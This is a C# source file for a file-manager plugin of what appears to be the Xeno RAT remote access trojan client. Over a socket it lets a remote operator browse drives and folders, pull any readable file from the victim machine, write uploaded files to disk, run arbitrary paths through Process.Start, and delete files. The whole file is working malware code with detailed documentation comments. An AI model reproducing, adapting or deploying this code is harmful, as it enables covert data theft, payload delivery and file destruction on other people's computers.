using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {

        /// <summary>
        /// Asynchronously runs the node and handles communication with connected nodes.
        /// </summary>
        /// <param name="node">The node to be run.</param>
        /// <remarks>
        /// This method sends a byte array with value 3 to indicate that the node has connected.
        /// It then enters a loop to handle communication with connected nodes.
        /// Upon receiving a byte array, it attempts to convert it to an integer representing the node ID.
        /// If the ID is found in the parent's subNodes, it sends a byte array with value 1 and adds the corresponding subNode to the current node.
        /// If the ID is not found, it sends a byte array with value 0 and continues to the next iteration of the loop.
        /// If no ID is received, the loop breaks.
        /// If an exception occurs, the loop breaks and the node is disconnected.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected

            while (node.Connected())
            {
                try
                {
                    byte[] id = await node.ReceiveAsync();
                    if (id != null)
                    {
                        int nodeid = node.sock.BytesToInt(id);
                        Node tempnode = null;
                        foreach (Node i in node.Parent.subNodes)
                        {
                            if (i.SetId == nodeid)
                            {
                                await node.SendAsync(new byte[] { 1 });
                                tempnode = i;
                                break;
                            }
                        }
                        if (tempnode == null)
                        {
                            await node.SendAsync(new byte[] { 0 });
                            continue;
                        }
                        node.AddSubNode(tempnode);
                        FileManagerHandler(tempnode);
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    break;
                }
            }
            node.Disconnect();


        }

        /// <summary>
        /// Handles file management operations based on the type of request received from the node.
        /// </summary>
        /// <param name="node">The node from which the request is received.</param>
        /// <exception cref="ArgumentNullException">Thrown when the received data is null.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method asynchronously handles file management operations based on the type of request received from the node.
        /// It first receives data from the node and checks if it is null. If so, it disconnects the node.
        /// Then, it determines the type of request based on the received data and performs the corresponding file management operation asynchronously.
        /// After processing the request, it triggers garbage collection to free up memory resources.
        /// </remarks>
        private async Task FileManagerHandler(Node node)
        {
            byte[] typedata = await node.ReceiveAsync();
            if (typedata == null)
            {
                node.Disconnect();
            }
            int type = typedata[0];
            if (type == 0)
            {
                await FileViewer(node);
            }
            else if (type == 1)
            {
                await FileUploader(node);
                //file download
            }
            else if (type == 2)
            {
                await FileDownloader(node);
                //file upload
            }
            else if (type == 3)
            {
                await StartFile(node);
            }
            else if (type == 4)
            {
                await DeleteFile(node);
            }
            GC.Collect();
        }

        /// <summary>
        /// Asynchronously deletes a file from the specified path and sends a success signal if the operation is successful, otherwise sends a failure signal.
        /// </summary>
        /// <param name="node">The node representing the connection for file deletion.</param>
        /// <remarks>
        /// This method receives data from the specified <paramref name="node"/> and attempts to delete the file at the path provided in the received data.
        /// If the received data is null, the method disconnects from the <paramref name="node"/>.
        /// If the file deletion is successful, a success signal is sent back to the <paramref name="node"/>.
        /// If an exception occurs during the file deletion process, a failure signal is sent back to the <paramref name="node"/>.
        /// </remarks>
        /// <exception cref="IOException">Thrown when an I/O error occurs during file deletion.</exception>
        /// <exception cref="UnauthorizedAccessException">Thrown when the operating system denies access to the file.</exception>
        /// <exception cref="ArgumentException">Thrown when the provided path is empty, contains only white spaces, or contains invalid characters.</exception>
        /// <exception cref="ArgumentNullException">Thrown when the provided path is null.</exception>
        /// <exception cref="PathTooLongException">Thrown when the provided path exceeds the system-defined maximum length.</exception>
        /// <exception cref="NotSupportedException">Thrown when the provided path contains a colon (":") that is not part of a volume identifier.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        private async Task DeleteFile(Node node)
        {
            byte[] success = new byte[] { 1 };
            byte[] fail = new byte[] { 0 };
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                node.Disconnect();
                return;
            }
            string path = Encoding.UTF8.GetString(data);
            try
            {
                File.Delete(path);
                await node.SendAsync(success);
            }
            catch
            {
                await node.SendAsync(fail);
            }
        }

        /// <summary>
        /// Asynchronously starts a file specified by the path received from the node and sends a success signal upon successful start, or a failure signal if an exception occurs.
        /// </summary>
        /// <param name="node">The node from which the path to the file is received.</param>
        /// <exception cref="ArgumentNullException">Thrown when the received data is null.</exception>
        /// <returns>An asynchronous task representing the operation.</returns>
        /// <remarks>
        /// This method receives a path to a file from the <paramref name="node"/> and attempts to start the file using the <see cref="Process.Start(string)"/> method.
        /// If successful, it sends a success signal back to the <paramref name="node"/>; otherwise, it sends a failure signal.
        /// </remarks>
        private async Task StartFile(Node node)
        {
            byte[] success = new byte[] { 1 };
            byte[] fail = new byte[] { 0 };
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                node.Disconnect();
                return;
            }
            string path = Encoding.UTF8.GetString(data);
            try
            {
                Process.Start(path);
                await node.SendAsync(success);
            }
            catch 
            {
                await node.SendAsync(fail);
            }
        }

        /// <summary>
        /// Checks if the specified file can be read.
        /// </summary>
        /// <param name="path">The path of the file to be checked for readability.</param>
        /// <returns>True if the file can be read; otherwise, false.</returns>
        /// <remarks>
        /// This method attempts to read the first character from the file specified by <paramref name="path"/> using a <see cref="StreamReader"/>.
        /// If the file can be read, it returns true; otherwise, it returns false.
        /// </remarks>
        private async Task<bool> CanRead(string path) 
        {
            try
            {
                char[] buffer = new char[1];
                using (StreamReader reader = new StreamReader(path))
                {
                    await reader.ReadAsync(buffer, 0, buffer.Length);
                }
                return true;
            }
            catch 
            { 
                
            }
            return false;
        }

        /// <summary>
        /// Checks if the specified path is writable.
        /// </summary>
        /// <param name="path">The path to be checked for write access.</param>
        /// <returns>True if the path is writable; otherwise, false.</returns>
        /// <remarks>
        /// This method checks if the specified <paramref name="path"/> is writable by attempting to open, write, and delete a file at the specified location.
        /// If the path is a file, it checks if the file can be opened with write access and then deletes it.
        /// If the path is a directory, it creates a temporary file in the directory to check if write access is possible and then deletes the temporary file.
        /// Returns true if the path is writable; otherwise, false.
        /// </remarks>
        public bool CanWrite(string path)
        {
            if (string.IsNullOrEmpty(path))
            {
                return false;
            }

            if (File.Exists(path))
            {
                try
                {
                    using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Write))
                    {
                        // Successfully opened the file with write access
                        fileStream.Close();
                    }
                }
                catch
                {
                    return false;
                }

                try
                {
                    // Delete the file if it exists and write access was confirmed
                    File.Delete(path);
                }
                catch
                {
                    return false;
                }
            }
            else if (Directory.Exists(Path.GetDirectoryName(path)))
            {
                string tempFilePath = Path.Combine(Path.GetDirectoryName(path), Guid.NewGuid().ToString());
                try
                {
                    using (FileStream fileStream = new FileStream(tempFilePath, FileMode.CreateNew, FileAccess.Write))
                    {
                        // Successfully created the file, so you can write to the directory
                        fileStream.Close();
                    }
                    File.Delete(tempFilePath);
                }
                catch 
                {
                    return false;
                }
                return true;
            }

            return false;
        }

        /// <summary>
        /// Downloads a file from the specified node and saves it to the specified path.
        /// </summary>
        /// <param name="node">The node from which the file will be downloaded.</param>
        /// <exception cref="ArgumentNullException">Thrown when the input node is null.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method asynchronously downloads a file from the specified node and saves it to the specified path.
        /// It first receives the file data from the node, then checks if the data is null and disconnects the node if it is.
        /// It then decodes the received data to get the file path and checks if writing to the path is permitted.
        /// If writing is not permitted, it sends a failure message to the node and disconnects it.
        /// If writing is permitted, it sends a success message to the node and starts writing the file data to the specified path.
        /// The method uses a FileStream to write the file data to the specified path and continues to receive and write data until the entire file is received.
        /// If an exception occurs during the file download process, it is caught and not handled, and a delay of 500 milliseconds is introduced before disconnecting the node.
        /// </remarks>
        private async Task FileDownloader(Node node)
        {
            byte[] success = new byte[] { 1 };
            byte[] fail = new byte[] { 0 };
            byte[] data = await node.ReceiveAsync();
            if (data == null)
            {
                node.Disconnect();
                return;
            }
            string path = Encoding.UTF8.GetString(data);
            if (!CanWrite(path))
            {
                await node.SendAsync(fail);
                node.Disconnect();
                return;
            }
            await node.SendAsync(success);
            try
            {
                using (FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.Write))
                {
                    while (true)
                    {
                        byte[] fileData = await node.ReceiveAsync();
                        if (fileData == null)
                        {
                            node.Disconnect();
                            return;
                        }
                        await fileStream.WriteAsync(fileData, 0, fileData.Length);
                        if (fileData.Length < 500000)
                        {
                            break;
                        }
                    }
                }
            }
            catch
            {
            }
            await Task.Delay(500);
            node.Disconnect();
        }

        /// <summary>
        /// Asynchronously uploads a file to the specified node.
        /// </summary>
        /// <param name="node">The node to which the file will be uploaded.</param>
        /// <exception cref="ArgumentNullException">Thrown when the input node is null.</exception>
        /// <returns>A <see cref="Task"/> representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method asynchronously uploads a file to the specified node. It first receives the file data from the node, then checks if the file can be read. If successful, it sends a success signal to the node, followed by the file length, and then proceeds to send the file data in blocks. After completion, it delays for 500 milliseconds and then disconnects from the node.
        /// </remarks>
        private async Task FileUploader(Node node)
        {
            byte[] success = new byte[] { 1 };
            byte[] fail = new byte[] { 0 };
            byte[] data=await node.ReceiveAsync();
            if (data == null) 
            {
                node.Disconnect();
                return;
            }
            string path=Encoding.UTF8.GetString(data);
            if (!await CanRead(path)) 
            {
                await node.SendAsync(fail);
                node.Disconnect();
                return;
            }
            await node.SendAsync(success);
            long length = new FileInfo(path).Length;
            await node.SendAsync(LongToBytes(length));
            using (FileStream stream = new FileStream(path, FileMode.Open, FileAccess.Read))
            {
                byte[] block = new byte[500000];
                int readcount;

                while ((readcount = await stream.ReadAsync(block, 0, block.Length)) > 0)
                {
                    byte[] blockBytes = new byte[readcount];
                    Array.Copy(block, blockBytes, readcount);
                    await node.SendAsync(blockBytes);
                }
            }
            await Task.Delay(500);
            node.Disconnect();
        }

        /// <summary>
        /// Asynchronously retrieves and sends directory and file information to the connected node.
        /// </summary>
        /// <param name="node">The node to communicate with.</param>
        /// <remarks>
        /// This method continuously receives data from the <paramref name="node"/> and processes the received path to retrieve directory and file information.
        /// If the received data is null, the method breaks the loop.
        /// If the received path is empty, the method retrieves logical drives; otherwise, it retrieves directories and files from the specified path.
        /// The retrieved information is then sent back to the <paramref name="node"/>.
        /// </remarks>
        /// <exception cref="Exception">
        /// An exception is caught if an error occurs during the retrieval or sending of directory and file information, in which case a failure signal is sent back to the <paramref name="node"/>.
        /// </exception>
        private async Task FileViewer(Node node) 
        {
            byte[] success = new byte[] { 1 };
            byte[] fail = new byte[] { 0 };
            while (node.Connected()) 
            {
                byte[] data=await node.ReceiveAsync();
                if (data == null) 
                {
                    break;
                }
                string path=Encoding.UTF8.GetString(data);
                try 
                {
                    string[] Directories = { };
                    string[] Files = { };
                    if (path == "")
                    {
                        Directories = System.IO.Directory.GetLogicalDrives();
                    }
                    else 
                    {
                        Directories = Directory.GetDirectories(path);
                        Files=Directory.GetFiles(path);
                    }
                    await node.SendAsync(success);
                    await node.SendAsync(node.sock.IntToBytes(Directories.Length));
                    foreach (string i in Directories) 
                    {
                        await node.SendAsync(Encoding.UTF8.GetBytes(i));
                    }
                    await node.SendAsync(node.sock.IntToBytes(Files.Length));
                    foreach (string i in Files)
                    {
                        await node.SendAsync(Encoding.UTF8.GetBytes(i));
                    }
                }
                catch 
                {
                    await node.SendAsync(fail);
                }
                //if path is empty use string[] drives = System.IO.Directory.GetLogicalDrives(); . return all the drives
                //use path to get files and such
            }
            node.Disconnect();
        }

        /// <summary>
        /// Converts a byte array to a long integer.
        /// </summary>
        /// <param name="data">The byte array to be converted.</param>
        /// <param name="offset">The zero-based byte offset in <paramref name="data"/> at which to begin converting.</param>
        /// <returns>The long integer value converted from the specified byte array starting at the specified offset.</returns>
        /// <remarks>
        /// This method converts a byte array to a long integer, taking into account the endianness of the system.
        /// If the system is little-endian, the method performs a bitwise OR operation on the bytes in the array to form the long integer value.
        /// If the system is big-endian, the method performs a bitwise OR operation on the bytes in reverse order to form the long integer value.
        /// </remarks>
        public long BytesToLong(byte[] data, int offset = 0)
        {
            if (BitConverter.IsLittleEndian)
            {
                return (long)data[offset] |
                       (long)data[offset + 1] << 8 |
                       (long)data[offset + 2] << 16 |
                       (long)data[offset + 3] << 24 |
                       (long)data[offset + 4] << 32 |
                       (long)data[offset + 5] << 40 |
                       (long)data[offset + 6] << 48 |
                       (long)data[offset + 7] << 56;
            }
            else
            {
                return (long)data[offset + 7] |
                       (long)data[offset + 6] << 8 |
                       (long)data[offset + 5] << 16 |
                       (long)data[offset + 4] << 24 |
                       (long)data[offset + 3] << 32 |
                       (long)data[offset + 2] << 40 |
                       (long)data[offset + 1] << 48 |
                       (long)data[offset] << 56;
            }
        }

        /// <summary>
        /// Converts a long integer to an array of bytes.
        /// </summary>
        /// <param name="data">The long integer to be converted.</param>
        /// <returns>An array of bytes representing the input <paramref name="data"/>.</returns>
        /// <remarks>
        /// This method converts the input long integer <paramref name="data"/> into an array of bytes.
        /// The method first checks the endianness of the system using BitConverter.IsLittleEndian property.
        /// If the system is little-endian, the method populates the byte array in little-endian order, otherwise in big-endian order.
        /// </remarks>
        public byte[] LongToBytes(long data)
        {
            byte[] bytes = new byte[8];

            if (BitConverter.IsLittleEndian)
            {
                bytes[0] = (byte)data;
                bytes[1] = (byte)(data >> 8);
                bytes[2] = (byte)(data >> 16);
                bytes[3] = (byte)(data >> 24);
                bytes[4] = (byte)(data >> 32);
                bytes[5] = (byte)(data >> 40);
                bytes[6] = (byte)(data >> 48);
                bytes[7] = (byte)(data >> 56);
            }
            else
            {
                bytes[7] = (byte)data;
                bytes[6] = (byte)(data >> 8);
                bytes[5] = (byte)(data >> 16);
                bytes[4] = (byte)(data >> 24);
                bytes[3] = (byte)(data >> 32);
                bytes[2] = (byte)(data >> 40);
                bytes[1] = (byte)(data >> 48);
                bytes[0] = (byte)(data >> 56);
            }

            return bytes;
        }
    }
}